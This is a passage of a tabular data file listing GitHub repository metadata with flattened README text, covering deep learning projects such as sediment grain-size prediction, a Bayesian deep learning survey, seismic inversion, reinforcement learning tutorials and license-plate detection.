configsievedsandsieve json python sedinetpredictcontinuous py c configsievedsand9prcs json and python sedinetpredictcontinuous py c config9percentiles json Other Continuous Examples Sediment grain size prediction 9 percentiles of the cumulative distribution on generic sands Open this link https colab research google com drive 1kQoWmyUOOQFYNebTi6t9VZP5HRkgjxLa Sediment grain size prediction 9 percentiles of the cumulative distribution on generic gravels Open this link https colab research google com drive 1VHciGSyp4wsgo8w6mSbxlPA228rScQ Sediment grain size prediction sieve size plus 4 percentiles of the cumulative distribution on a small population of beach sands Open this link https colab research google com drive 1oXtYZJ3niDm3XOeKG1xikOZSjqIBVbQD which is equivalent to the following respective commands from the command line using an installed SediNet see below python sedinetpredictcontinuous py c configsand json python sedinetpredictcontinuous py c configgravel json and python sedinetpredictcontinuous py c configsievedsandsieveplus json Fork this repo and run on Google Cloud Platform GCP First follow instructions here https tudip com blog post run jupyter notebook on google cloud platform for how to set up an instance to run in GCP Make sure to set a static IP address as per the instructions and make a note of that because you ll need it later Then open a shell into the VM and set it up to ssh keygen t rsa b 4096 C yourname youremail com eval ssh agent s ssh add ssh idrsa cat ssh idrsa pub Then copy the key into your github profile keys For more information about how to do that see here https help github com en articles adding a new ssh key to your github account xclip likely won t work but you can simply copy Ctrl C the text printed to screen You will be cloning your fork of the main repo so replace YOURUSERNAME in the below code to clone the repo and set up a conda environment to run in git clone depth 1 git github com YOURUSERNAME SediNet git cd SediNet pip install upgrade pip conda env create f condaenv sedinet yml source activate sedinet Now you can run sedinet on the cloud To run the jupyter notebooks run the following command to run the jupyter notebook server jupyter notebook NotebookApp iopubdataratelimit 10000000 The jupyterlab server will be displayed at http IP 8888 where IP is the static IP of the VM that you noted earlier Install and run on your computer You must have python 3 pip for python 3 git and conda On Windows I recommend the latest Anaconda https www anaconda com distribution release On Linux git should come as standard and miniconda would be the way to go Personally I don t use conda but system builds deb yum apt within a virtual environment but either way a VM of some description to contain SediNet would be a good idea Mac users Windows git clone depth 1 https github com MARDAScience SediNet git Linux Mac git clone depth 1 git github com MARDAScience SediNet git Anaconda miniconda if you are a regular or long term conda user perhaps this is a good time to conda clean packages and conda update n base conda conda env create f condaenv sedinet yml conda activate sedinet then finally pip install Image panel Later when you re done conda deactivate sedinet Install and instructions for developers If you wish to contribute to the development of this project yes please it is better that you first fork this repository to your own github then work on changes and submit a pull request Before submitting please test your code changes by running a full set of tests python sedinetpredictcontinuous py c configsievedsandsieve json python sedinetpredictcontinuous py c configsievedsand9prcs json python sedinetpredictcontinuous py c config9percentiles json python sedinetpredictcategorical py c configpop json python sedinetpredictcategorical py c configshape json python sedinetpredictcontinuous py c configsand json python sedinetpredictcontinuous py c configgravel json python sedinetpredictcontinuous py c configsievedsandsieveplus json then verifying they all executed without error Please then delete all outputs from these tests You can also contribute imagery this way but if you do so also please provide a dataset csv file that goes along with the imagery a file that describes the data with your name and contact details and you should also thank yourself in this README Run the interactive applications in your web browser bokeh serve RunSediNet ipynb which should open a web application to run through your browser at http localhost 60339 Replicate the paper results Note that you may get slightly different results than in the paper because training and testing files are randomly selected with a randomness that can t fully be controlled with a seed Predict grain size shape population from a set of images The ipynb files in the notebooks directory are the same jupyter notebooks as in the Colab notebook links above You can run them by conda activate sedinet jupyter notebook then in your browser you should be able to navigate to the notebooks you wish to execute The following instructions are for running the provided python scripts on your computer Continuous Sediment grain size prediction sieve size on a small population of beach sands python sedinetpredictcontinuous py c configsievedsandsieve json sievesandsieve512batch8xy base22predict https user images githubusercontent com 3596509 62002111 a4610600 b0b2 11e9 9feb 5c6e34fe517e png Sediment grain size prediction 9 percentiles of the cumulative distribution on a small population of beach sands python sedinetpredictcontinuous py c configsievedsand9prcs json sievesand9prcs512batch8xy base26predict https user images githubusercontent com 3596509 62002234 8c8a8180 b0b4 11e9 84d6 7bd46607f04a png Sediment grain size prediction 9 percentiles of the cumulative distribution on a large 400 image dataset python sedinetpredictcontinuous py c config9percentiles json global9prcs512batch8xy base18predict https user images githubusercontent com 3596509 62009719 4ca8b600 b117 11e9 87f0 4935b89d864c png Categorical Use SediNet to estimate sediment population python sedinetpredictcategorical py c configpop json popbase22modelcheckpointcmpredict https user images githubusercontent com 3596509 62009407 a1e2c880 b113 11e9 919b 60d57df65eb4 png Use SediNet to estimate sediment shape python sedinetpredictcategorical py c configshape json shapebase20modelcheckpointcmpredict https user images githubusercontent com 3596509 62009373 43b5e580 b113 11e9 8dc7 a3a5bf7d1969 png Other Examples Sediment grain size prediction 9 percentiles of the cumulative distribution on generic sands python sedinetpredictcontinuous py c configsand json sandgeneric9prcs512batch8xy base16predict https user images githubusercontent com 3596509 62002419 6e268500 b0b8 11e9 8c1a 83fc54e9d66a png Sediment grain size prediction 9 percentiles of the cumulative distribution on generic gravels python sedinetpredictcontinuous py c configgravel json gravelgeneric9prcs512batch8xy base16predict https user images githubusercontent com 3596509 62002214 46352280 b0b4 11e9 84fc 65e66116386b png Sediment grain size prediction sieve size plus 4 percentiles of the cumulative distribution on a small population of beach sands python sedinetpredictcontinuous py c configsievedsandsieveplus json sievesandsieveplus512batch8xy base18predict https user images githubusercontent com 3596509 62002149 3bc65900 b0b3 11e9 9049 7d39b7452e27 png Train the models yourself Continuous Train SediNet for sediment grain size prediction 9 percentiles of the cumulative distribution on a small population of beach sands python trainsedinetcontinuous py c configsievedsand9prcs json sievesand9prcs512batch8xy base26log https user images githubusercontent com 3596509 62001390 40374580 b0a4 11e9 8803 1aabce95dab9 png Train SediNet for sediment mid sieve size on a small population of beach sands python trainsedinetcontinuous py c configsievedsandsieve json sievesandsieve512batch8xy base22log https user images githubusercontent com 3596509 62001432 5bef1b80 b0a5 11e9 9a74 c613b1ad85d5 png Train SediNet for sediment grain size prediction 9 percentiles of the cumulative distribution on a large population of 400 images python trainsedinetcontinuous py c config9percentiles json global9prcs512batch8xy base24log https user images githubusercontent com 3596509 62001561 64952100 b0a8 11e9 973b b496f4e1dfee png Categorical Train SediNet for sediment population prediction python trainsedinetcategorical py c configpop json popbase22modelcheckpointcmT https user images githubusercontent com 3596509 62001568 8ee6de80 b0a8 11e9 8e13 634a614e979b png popbase22modelcheckpointcm https user images githubusercontent com 3596509 62001571 927a6580 b0a8 11e9 89e1 10b88b760ceb png Train SediNet for sediment shape prediction python trainsedinetcategorical py c configshape json shapebase20modelcheckpointcmT https user images githubusercontent com 3596509 62001821 d885f800 b0ad 11e9 9082 dca57913f8f8 png shapebase20modelcheckpointcm https user images githubusercontent com 3596509 62001822 da4fbb80 b0ad 11e9 846e aa4d7cbd1256 png Other examples Train SediNet for sediment grain size prediction sieve size plus 4 percentiles of the cumulative distribution on a small population of beach sands python trainsedinetcontinuous py c configsievedsandsieveplus json sievesandsieveplus512batch8xy base18log https user images githubusercontent com 3596509 62001639 817e2400 b0a9 11e9 920e 9b729873a41c png Train SediNet for sediment grain size prediction 9 percentiles of the cumulative distribution on gravel images python trainsedinetcontinuous py c configgravel json gravelgeneric9prcs512batch8xy base16log https user images githubusercontent com 3596509 62001702 00c02780 b0ab 11e9 93d5 6d586e960b03 png Train SediNet for sediment grain size prediction 9 percentiles of the cumulative distribution on sand images python trainsedinetcontinuous py c configsand json sandgeneric9prcs512batch8xy base16log https user images githubusercontent com 3596509 62001865 b80a6d80 b0ae 11e9 8dcd 0c3c3030c,2019-07-26T19:49:00Z,2019-11-08T06:00:40Z,Jupyter Notebook,MARDAScience,User,4,8,2,39,master,dbuscombe-usgs#MARDAScience,2,1,1,2,2,1,1
js05212,BayesianDeepLearning-Survey,arxiv#bayesian#bayesian-deep-learning#bdl#deep-learning#machine-learning#neural-networks#survey#variational-autoencoders,An Updating Survey for Bayesian Deep Learning BDL Survey Towards Bayesian Deep Learning A Survey by Wang et al 2016 Arxiv Version https arxiv org pdf 1604 01662 pdf and TKDE Version http wanghao in paper TKDE16BDL pdf BDL and Recommender Systems Collaborative Deep Learning for Recommender Systems by Wang et al KDD 2015 PDF http wanghao in paper KDD15CDL pdf Project Page http wanghao in CDL htm 2014 Arxiv Version https arxiv org abs 1409 2944 Collaborative Recurrent Autoencoder Recommend while Learning to Fill in the Blanks by Wang et al NIPS 2016 PDF https arxiv org abs 1611 00454 Collaborative Knowledge Base Embedding for Recommender Systems by Zhang et al KDD 2016 PDF https dl acm org citation cfm id 2939673 Collaborative Deep Ranking A Hybrid Pair Wise Recommendation Algorithm with Implicit Feedback by Ying et al PAKDD 2016 PDF https link springer com chapter 10 1007 978 3 319 31750 244 Collaborative Variational Autoencoder for Recommender Systems by Li et al KDD 2017 PDF https www kdd org kdd2017 papers view collaborative variational autoencoder for recommender systems Variational Autoencoders for Collaborative Filtering by Liang et al WWW 2018 PDF https arxiv org abs 1802 05814 BDL and Healthcare Electronic Health Record Analysis via Deep Poisson Factor Models by Henao et al JMLR 2016 PDF http www jmlr org papers volume17 15 429 15 429 pdf Structured Inference Networks for Nonlinear State Space Models by Krishnan et al AAAI 2017 PDF https arxiv org pdf 1609 09869 pdf Black Box FDR by Tansey et al ICML 2018 PDF https arxiv org abs 1806 03143 Bidirectional Inference Networks A Class of Deep Bayesian Networks for Health Profiling by Wang et al AAAI 2019 PDF https arxiv org pdf 1902 02037 Sampling free Uncertainty Estimation in Gated Recurrent Units with Applications to Normative Modeling in Neuroimaging by Hwang et al UAI 2019 PDF http auai org uai2019 proceedings papers 296 pdf BDL and NLP Sequence to Better Sequence Continuous Revision of Combinatorial Structures by Mueller et al ICML 2017 PDF http proceedings mlr press v70 mueller17a html BDL and Computer Vision Attend Infer Repeat Fast Scene Understanding with Generative Models by Eslami et al NIPS 2016 PDF https arxiv org abs 1603 08575 Faster Attend Infer Repeat with Tractable Probabilistic Models by Stelzner et al ICML 2019 PDF http proceedings mlr press v97 stelzner19a html Asynchronous Temporal Fields for Action Recognition by Sigurdsson et al CVPR 2017 PDF https arxiv org pdf 1612 06371 pdf BDL and Control Embed to Control A Locally Linear Latent Dynamics Model for Control from Raw Images by Watter et al NIPS 2015 PDF https arxiv org abs 1506 07365 BDL and Graphs Link Prediction Graph Neural Networks etc Relational Deep Learning A Deep Latent Variable Model for Link Prediction by Wang et al AAAI 2017 PDF https www aaai org ocs index php AAAI AAAI17 paper download 14346 14463 Graphite Iterative Generative Modeling of Graphs by Grover et al ICML 2019 PDF https arxiv org pdf 1803 10459 pdf Relational Variational Autoencoder for Link Prediction with Multimedia Data by Li et al ACM MM 2017 PDF https dl acm org citation cfm id 3126774 Stochastic Blockmodels meet Graph Neural Networks by Mehta et al ICML 2019 PDF https arxiv org pdf 1905 05738 pdf BDL and Topic Modeling Relational Stacked Denoising Autoencoder for Tag Recommendation by Wang et al AAAI 2015 PDF https www aaai org ocs index php AAAI AAAI15 paper download 9350 9980 Scalable Deep Poisson Factor Analysis for Topic Modeling by Gan et al ICML 2015 PDF http proceedings mlr press v37 gan15 html Deep Latent Dirichlet Allocation with Topic layer adaptive Stochastic Gradient Riemannian MCMC by Cong et al ICML 2017 PDF https dl acm org citation cfm id 3305471 Deep Unfolding for Topic Models by Chien et al TPAMI 2017 PDF https ieeexplore ieee org abstract document 7869412 Neural Relational Topic Models for Scientific Article Analysis by Bai et al CIKM 2018 PDF https dl acm org citation cfm id 3271696 Dirichlet Belief Networks for Topic Structure Learning by Zhao et al NIPS 2018 PDF http papers nips cc paper 8020 dirichlet belief networks for topic structure learning BDL and Speech Recognition Recurrent Poisson Process Unit for Speech Recognition by Huang et al AAAI 2019 PDF https pdfs semanticscholar org 4970 fa3189cd9a9c817ba72082e2f3d5fc9a7df1 pdf BDL as a Framework Miscellaneous Towards Bayesian Deep Learning A Framework and Some Existing Methods by Wang et al TKDE 2016 PDF https arxiv org abs 1608 06884 Composing Graphical Models with Neural Networks for Structured Representations and Fast Inference by Johnson et al NIPS 2016 PDF https arxiv org abs 1603 06277 Bayesian Probabilistic Neural Networks as Building Blocks of BDL Learning Stochastic Feedforward Networks by Neal et al Technical Report 1990 PDF https www cs toronto edu hinton absps sff pdf A Practical Bayesian Framework for Backprop Networks by MacKay et al Neural Computation 1992 PDF https pdfs semanticscholar org b0f2 433c088591d265891231f1c22424047f1bc1 pdf Keeping Neural Networks Simple by Minimizing the Description Length of the Weights by Hinton et al COLT 1993 PDF http citeseerx ist psu edu viewdoc summary doi 10 1 1 44 3435 Practical Variational Inference for Neural Networks by Alex Graves NIPS 2011 PDF https papers nips cc paper 4329 practical variational inference for neural networks Auto Encoding Variational Bayes by Kingma et al ArXiv 2014 PDF https arxiv org pdf 1312 6114 pdf Deep Exponential Families by Ranganath et al AISTATS 2015 PDF https arxiv org abs 1411 2581 Weight Uncertainty in Neural Networks by Blundell et al ICML 2015 PDF https arxiv org abs 1505 05424 Probabilistic Backpropagation for ScalableLearning of Bayesian Neural Networks by Hernandez Lobato et al ICML 2015 PDF http proceedings mlr press v37 hernandez lobatoc15 pdf Variational Dropout and the Local Reparameterization Trick by Kingma et al NIPS 2015 PDF https arxiv org pdf 1506 02557 pdf The Poisson Gamma Belief Network by Zhou et al NIPS 2015 PDF http papers nips cc paper 5645 the poisson gamma belief network Deep Poisson Factor Modeling by Henao et al NIPS 2015 PDF http papers nips cc paper 5786 deep poisson factor modeling Natural Parameter Networks A Class of Probabilistic Neural Networks by Wang et al NIPS 2016 PDF http wanghao in paper NIPS16NPN pdf Project Page https github com js05212 NPN Code https github com js05212 NPN Adversarial Variational Bayes Unifying Variational Autoencoders and Generative Adversarial Networks by Mescheder et al ICML 2017 PDF https arxiv org pdf 1701 04722 pdf Stick Breaking Variational Autoencoders by Nalisnick et al ICLR 2017 PDF https openreview net forum id S1jmAotxg Bayesian GAN by Saatchi et al NIPS 2017 PDF https arxiv org abs 1705 09558 Lightweight Probabilistic Deep Networks by Gast et al CVPR 2018 PDF http openaccess thecvf com contentcvpr2018 html GastLightweightProbabilisticDeepCVPR2018paper html Feed forward Propagation in Probabilistic Neural Networks with Categorical and Max Layers by Shekhovtsov et al ICLR 2018 PDF https openreview net forum id SkMuPjRcKQ ProbGAN Towards Probabilistic GAN with Theoretical Guarantees by He et al ICLR 2019 PDF http wanghao in paper ICLR19ProbGAN pdf Project Page https github com hehaodele ProbGAN Sampling free Epistemic Uncertainty Estimation Using Approximated Variance Propagation by Postels et al ICCV 2019 PDF https arxiv org abs 1908 00598,2019-07-17T00:51:13Z,2019-12-10T22:24:00Z,n/a,js05212,User,1,8,0,27,master,js05212,1,0,0,0,0,0,0
Marvinsky,machine_learning_vs_deep_learning,n/a,Machine Learning vs Deep Learning Generally speaking in this Webinar we are going to learn that Deep Learning is a subset of Machine Learning and when to apply Machine Learning Prediction based on Historical Data and Deep Learning Prediction applications in Image Recognition object Detection etc In order to know the important things of these areas of Artificial Intelligence we we need to understand concepts such as Definitions Approaches and Algorithms of Machine Learning Definitions Neural Networks Architectures of Deep Learning 1 Approaches of Machine Learning 2 Linear Regression https en wikipedia org wiki Linearregression See Predicting House s price using Linear Regression https github com Marvinsky machinelearningvsdeeplearning blob master Predicting 20House s 20price 20using 20Linear 20Regression ipynb 3 Classification 3 1 Support Vector Machine https towardsdatascience com support vector machine introduction to machine learning algorithms 934a444fca47 Clustering Distance 3 2 K Nearest Neighbors KNN https www analyticsvidhya com blog 2018 03 introduction k neighbours algorithm clustering Pseudo Code for every point in our dataset calculate the distance between the current point and inputvector sort the distances in increasing order take k items with lowest disances to inputvector find the majority class among these items return the majority class label from the k closest neighbors 4 Clustering https en wikipedia org wiki K meansclustering 4 1 K means Optimization Function Lossy Data Compression 5 Recommendation Systems https en wikipedia org wiki Recommendersystem 5 1 Matrix Factorization 5 3 Singular Value Decomposition 6 Deep Reinforcement Learning Systems https deepmind com research dqn 6 1 Atari Game See Pong AI with Policy Gradients https www youtube com watch timecontinue 53 v YOW8m2YGtRg 6 2 DeepMind AlphaGo vs Lee Sedol 7 Deep Learning See Image Classification Multi Layer Perceptron MNIST https github com Marvinsky machinelearningvsdeeplearning blob master Image 20Classification 20 20Multi Layer 20Perceptron 20 20MNIST ipynb 7 1 What is it used for Pretty much everywhere Recent applications include things such as beating humans in games such as Go or even jeopardy detecting spam in emails forecasting stock prices recognizing images in a picture and even diagnosing illnesses with more precision than doctors One of the most celebrated applications in deep learning is self driving cars What is the heart of deep learning The wonderful object called Neural Networks Neural Networks mimic the process of how the brain operates with neurons that fire bits of information 7 2 Neural Network 7 2 Perceptron 7 3 Architectures 7 3 More Applications Train AI to talk WaveNet https deepmind com blog wavenet generative model raw audio CNN for text classification http www wildml com 2015 12 implementing a cnn for text classification in tensorflow Pictionary with CNN QuickDraw https quickdraw withgoogle com Intelligent Flying Machines IFM https www youtube com watch v AMDiR61f86Y Natural Neural Network to change your look FaceApp https www digitaltrends com photography faceapp neural net image editing After completing the theory part we are going to show two real world problems from Machine Learning and Deep Learning Hope you enjoy this Webinar Thanks,2019-07-11T15:25:58Z,2019-07-23T20:38:31Z,Jupyter Notebook,Marvinsky,User,0,7,3,3,master,Marvinsky,1,0,0,0,0,0,0
vkazei,deeplogs,deep-learning#deep-neural-networks#full-waveform-inversion#seismic-imaging#seismic-inversion#well-logs,deeplogs Velocity model building by deep learning Multi CMP gathers are mapped into velocity logs This repository reproduces the results of the paper Kazei V Ovcharenko O Zhang X Peter D Alkhalifah T Mapping seismic data cubes to vertical velocity profiles by deep learning New full waveform inversion paradigm Geophysics submitted 2019 https repository kaust edu sa handle 10754 656082 Run data velocitylogsfromseismic ipynb Common midpoint gathers are used to build a velocity log at the central midpoint location This allows us to utilize relevant traces for inversion and exploit the regualrity of sampling in typical active seismic acquisition cmptolog latex Fig relevantCMP png With deep learning and regularly sampled data inversion can be set up as a search for mapping from data cubes to 1D vertical velocity profiles Which is a lot easier to learn compared to mapping to the whole velocity models 2D or 3D cmptolog latex Fig inoutshape png We generate a set of pseudo random models for training by cropping and skewing cmptolog latex Fig randommodelexample png Velocity model is then retrieved as an assembly of depth profiles Deep learning models are naturally stochastic so we train as set of five to provide initial uncertainty estimates cmptolog latex Fig invertedMarmousi png,2019-06-30T07:20:36Z,2019-09-09T10:50:57Z,Jupyter Notebook,vkazei,User,1,7,4,32,master,vkazei#ovcharenkoo,2,0,0,0,0,0,0
PredictiveIntelligenceLab,USNCCM15-Short-Course-Recent-Advances-in-Physics-Informed-Deep-Learning,n/a,images schedule png USNCCM15 Short Course Recent Advances in Physics Informed Deep Learning Link http 15 usnccm org sc15 009 Instructors Dr Paris Perdikaris https www seas upenn edu directory profile php ID 237 University of Pennsylvania Dr Maziar Raissi http www dam brown edu people mraissi NVIDIA Overview Advances in machine learning are continuously penetrating computational science and engineering In this course we plan to review recent advances in deep learning with a particular focus on the development of data driven algorithms for model discovery forecasting and uncertainty quantification in physical and engineering systems In this course we will i present a comprehensive review of state of the art deep learning tools including feed forward convolutional recurrent neural networks variational auto encoders and generative adversarial networks ii show how these data driven models can be constrained to encode physical priors and domain knowledge iii demonstrate how they can help us distill hidden physics from raw data and construct scalable and predictive surrogate models iv provide a collection of diverse applications in computational science including both forward and inverse problems in the presence of uncertainty Our goals for this course are threefold i cover fundamental methodological and algorithmic concepts ii showcase a collection of practical applications and iii design a series of hands on tutorials that will illustrate key practical and implementation aspects Attendees will leave this course with a well rounded understanding of the capabilities brought by deep learning in a wide range of applications in computational science and engineering They will also sharpen their hands on skills and familiarize themselves with how to adapt these tools to their respective application domains Setting up your computing environment To follow the hands on tutorials please make sure you have the following software properly installed and working on your computer A Python 3 distrubution configured for scientific computing The simplest way to set this up is by installing the Anaconda https anaconda org anaconda python distribution Tensorflow https www tensorflow org If you have access to GPU hardware make sure you install a version with GPU support Jupyter notebook http jupyter org You will need this in order to follow some of the in class tutorials Git https git scm com downloads You will need this in order to download and stay in sync with the latest code we will develop in class A primer on Tensorflow To best follow the hands on tutorials attendeed are expected to be familiar with basic concepts in Tensorflow programming e g computational graphs placeholders automatic differentiation New users are encouraged to study the tutorials presented here https github com aymericdamien TensorFlow Examples,2019-07-22T14:40:15Z,2019-11-10T23:27:46Z,Jupyter Notebook,PredictiveIntelligenceLab,Organization,5,7,8,3,master,paraklas,1,0,0,0,0,0,0
dl-ub-summer-school,2019,n/a,Invited talks videos YouTube playlist https www youtube com playlist list PLfpZLNQa zf7LnxjxtocWw47j5bG1oiun Invited talks videos noise reduced YouTube playlist https www youtube com playlist list PL42OrOpwnMBNUChPnJ7mNmnI4j7O08oZ Lecture and seminar videos YouTube playlist https www youtube com playlist list PLfpZLNQa zf5NsYoW5JGaBr759IBEPR3 Lecture and seminar videos noise reduced YouTube playlist https www youtube com playlist list PL42OrOpwnMBOHgxiHeIeEM2o5nAvvTl6o Lecture slides Google Drive folder https drive google com drive folders 1qPx0gh6M2WHAYzUE0X6a1S4EpdHch1 Seminar code seminar ipynb GitHub repository https github com dl ub summer school 2019,2019-07-20T07:10:50Z,2019-09-22T07:02:00Z,Jupyter Notebook,dl-ub-summer-school,Organization,4,7,15,29,master,qerelt#yanjika#bayartsogt-ya#Ochirgarid#delgermurun#akmoyu,6,0,0,0,1,0,0
LostInBayes,Training-Intelligent-Game-Agents-with-Deep-Reinforcement-Learning,n/a,Training Intelligent Game Agents with Deep Reinforcement Learning Material for PyData London 2019 talk Python3 6 3 7 should work Tensorflow 1 13 We will not be using Tensorflow 2 0 for this tutorial but I intend to make copies of the notebook rewritten with Tensorflow 2 0 before the end of July 2019 Whilst a familiarity with deep learning is expected for the talk if you are installing tensorflow for the first time please install the CPU only version In a virtual environment pip install r requirements txt,2019-07-09T11:52:52Z,2019-07-24T03:54:47Z,n/a,LostInBayes,User,0,7,4,10,master,LostInBayes,1,0,0,0,0,0,0
Parsa33033,Deep-Reinforcement-Learning-DQN,n/a,Deep Reinforcement Learning DQN Deep Reinforcement Learning containing 1 DQN 2 Double DQN 3 Dueling DQN 4 Noisy Net Noisy DQN 5 DQN with Prioritized Experience Replay 6 Noisy Double DQN with Prioritized Experience Replay 7 Noisy Dueling Double DQN with Prioritized Experience Replay Dependencies 1 python 3 6 2 tensorflow 1 12 0 3 cuda 9 0 4 cuDNN 7 1 4 Results image https github com Parsa33033 Deep Reinforcement Learning DQN blob master Plot Figure1 png the results are the mean of the scores in each 200 episodes of cartpole v1 tutorial link to the tutorial link https medium com parsahm deep reinforcement learning dqn double dqn dueling dqn noisy dqn and dqn with prioritized 551f621a9823,2019-07-21T20:14:45Z,2019-11-03T21:47:00Z,Python,Parsa33033,User,0,7,1,10,master,Parsa33033,1,0,0,0,0,0,0
shreyapamecha,Speed-Estimation-of-Vehicles-with-Plate-Detection,license-plate#license-plate-recognition#number-plate#speed#speed-estimation#vehicle-detection#vehicle-detection-and-tracking,Speed Estimation of Vehicles with Plate Detection The main objective of this project is to identify overspeed vehicles using Deep Learning and Machine Learning Algorithms After acquisition of series of images from the video trucks are detected using Haar Cascade Classifier The model for the classifier is trained using lots of positive and negative images to make an XML file This is followed by tracking down the vehicles and estimating their speeds with the help of their respective locations ppm pixels per meter and fps frames per second Now the cropped images of the identified trucks are sent for License Plate detection The CCA Connected Component Analysis assists in Number Plate detection and Characters Segmentation The SVC model is trained using characters images 20X20 and to increase the accuracy 4 cross fold validation Machine Learning is also done This model aids in recognizing the segmented characters After recognition the calculated speed of the trucks is fed into an excel sheet along with their license plate numbers These trucks are also assigned some IDs to generate a systematized database To run SpeedDetection LicensePlateDetection py follow these steps below 1 Download IDLE python from this site https www python org downloads 2 Install OpenCV and dlib libraries from https www learnopencv com install dlib on windows 3 Install these other libraries as well skimage sklearn openpyxl threading time joblib numpy matplotlib datetime os 4 Through Command Prompt run this code Make sure to change the directories Methodology 1 Image Acquisition Extracting series of images from a video one by one then reading them using cv2 Open Source Computer Vision library 2 Trucks Detection Using Haar Cascade CLassifier This Algorithm includes 4 stages a Haar Feature Selction b Creating Integral Images c Adaboost Adaptive boosting Training d Cascading Classifiers Functions Used CascadeClassifier and detectMultiScale 3 Training a machine to make an XML file I WAY Command Prompt Method a Collection of Image Database b Augmentation for boosting image database c Crop and mark positive images using Objectmarker or Image Clipper d Haar Training Refernce www cs auckland ac nz m rezaei Downloads html II WAY Cascade Trainer Graphical User Interface Install GUI software and specify the values of parameters Reference http amin ahmadi com cascade trainer gui 4 Tracking the detected trucks using dlib library Functions Used a dlib correlationtracker b dlib correlationtracker starttrack c dlib rectangle 5 Speed Estimation Speed in km hr Distance Travelled by the detected trucks in meters fps 3 6 6 CCA Connected Component Analysis for detecting License Plate and segmenting Characters Functions Used skimage measure label and skimage measure regionprops Assumptions used in this code change it accordingly height of the license plate 6 18 of the height of the cropped truck image width of the license plate 8 5 20 of the width of the cropped truck image height of the characters to be segmented 18 75 37 5 of the height of the license plate width of the characters to be segmented 5 40 of the width of the license plate 7 Support Vector Classifier and Cross Validation 4 fold for predicting Characters 8 Working with Excel Sheet Using openpyxl library the calculated speed of trucks can be fed into the excel sheet along with their license plate numbers These trucks are assigned some IDs to generate a systemized database 9 Overspeed Vehicle Enumeration Limitations 1 Sometimes the dlib correlation tracker fails when the scale of the object keeps on changing 2 The estimated speed is not so authentic because of the expensive scanning and processing time 3 A good resolution camera ought to be used for predicting non erroneous license plate characters Neural Enhance Super Resolution of images Deep Learning can also be used instead However it increases the processing time 4 The license plate occasionally are covered with dust or are veiled by a rod in the front or are not even there thereby not letting the detection possible 5 Old trucks cannot be identified because the machine is trained using only new models of trucks Inspired by https github com apoorva dave LicensePlateDetector blob master DetectPlate py Reference https github com kraten vehicle speed check https github com kraten vehicle speed check blob master myhaar xml,2019-07-23T17:20:43Z,2019-11-21T07:14:20Z,Python,shreyapamecha,User,1,7,6,9,master,shreyapamecha,1,0,0,3,0,1,0
unccv,deep_learning_for_computer_vision,n/a,Deep Learning for Computer Vision graphics openpose gif Deep Learning has recently changed the landscape of computer vision and other fields and is largely responsible for a 3rd wave of interest and excitment about artificial intellgence In this module we ll cover the basics of deep learning for computer vision Lectures Lecture Notebook Slides Key Topics Additional Reading Viewing Introduction to Pytorch Notebook https github com unccv deeplearningforcomputervision blob master notebooks introductiontopytorch ipynb Why Pytorch Pytorch as Numpy with GPU Support simple neural network in Pytorch automatic differentiation nn Module PyTorch layers PyTorch Optim nn Sequential Great Torch Intro by Jeremy Howard https pytorch org tutorials beginner nntutorial html Get results fast with fastai Notebook https github com unccv deeplearningforcomputervision blob master notebooks Get 20Results 20Fast 20with 20fastai ipynb Jeremy Howard and the fastai philosophy databunches learners classifiction simplified object detection semantic segmentation multistak learning fastai course https github com fastai course v3 Deep Learning Classification In Depth Part 1 Notebook https github com unccv deeplearningforcomputervision blob master notebooks imageclassificationpart1 ipynb Stochastic gradient descent regression vs classification one hot encoding cost functions and maximum likelihood cross entropy Ian Goodfellow s Deep Learning Chapter 1 Section 6 2 and Section 8 1 https www deeplearningbook org Deep Learning Classification In Depth Part 2 Notebook https github com unccv deeplearningforcomputervision blob master notebooks imageclassificationpart2 ipynb CNNs pooling and strides AlexNet walkthrough ImageNet transfer learning adaptive pooling dropout data augmentation a little historical perspective AlexNet Paper https papers nips cc paper 4824 imagenet classification with deep convolutional neural networks pdf GANs Notebook https github com unccv deeplearningforcomputervision blob master notebooks Generative 20Adversarial 20Networks ipynb Ian Goodfellow invents GANs the world s simplest GAN nash equilibria a dive into higher dimensions DCGAN to the rescue Visualizing GANs GAN grow up sortof StyleGAN insanity the unbelievably interesting world of GAN variants Goodfellow et al 2014 https arxiv org pdf 1406 2661 pdf StyleGAN https arxiv org pdf 1812 04948 pdf CycleGAN https arxiv org pdf 1703 10593 pdf GPU Usage Setup A significant portion of the code in this repo especially the fastai parts will be painfully slow without a GPU If you don t have access to a physical GPU machine we recommend renting one There are some really great easy affordable ways to do this and with a couple platforms Amazond Web Services Google Cloud you are likeley eldigable for free computer credits as a student fastai https course fast ai startsalamander html has a really nice summary of the avaible cloud platforms for this type of thing along with setup instructions A number of services come with fastai already installed which makes life even easier,2019-07-03T10:11:26Z,2019-11-14T04:20:33Z,Jupyter Notebook,unccv,Organization,2,6,5,30,master,stephencwelch#jascorea#jajukshitij,3,0,0,0,0,0,2
AiZhanghan,deep-learning-fault-diagnosis,n/a,deep learning fault diagnosis Rolling Element Bearings Fault Intelligent Diagnosis Based on Convolutional Neural Network Using Raw Sensing Signal 1 A New Deep Learning Model for Fault Diagnosis with Good Anti Noise and Domain AdaptationAbility on Raw Vibration Signals 2 1 https link springer com chapter 10 1007 978 3 319 50212 010 2 http apps webofknowledge com fullrecord do product UA ampsearchmode GeneralSearch ampqid 1 ampSID 7BQxbNTFkuf8oUqC9BD amppage 1 ampdoc 1 Pointwise,2019-06-28T11:58:28Z,2019-11-30T01:04:18Z,Python,AiZhanghan,User,0,6,3,25,master,AiZhanghan,1,0,0,0,0,0,0
swlee23,Deep-Learning-Time-Series-Anomaly-Detection,n/a,Deep Learning Time Series Anomaly Detection,2019-06-26T02:24:45Z,2019-11-28T02:13:20Z,Jupyter Notebook,swlee23,User,0,6,2,91,master,swlee23,1,0,0,0,0,0,0
chan111222333,value-based-deep-reinforcement-learning-trading-model-in-pytorch,n/a,value based deep reinforcement learning trading model in pytorch This is a repo for deep reinforcement learning in trading I used value based double DQN variant for single stock trading The agent learn to make decision between selling holding and buying stock with fixed amount based on the reward returned from the environment YoutubeVideo https youtu be bZLzHkrAUBU If you like please subscript I will keep upload and create more interesting and innovative projects,2019-07-01T05:06:56Z,2019-11-03T04:24:58Z,Python,chan111222333,User,1,6,2,1,master,chan111222333,1,0,0,0,0,0,0
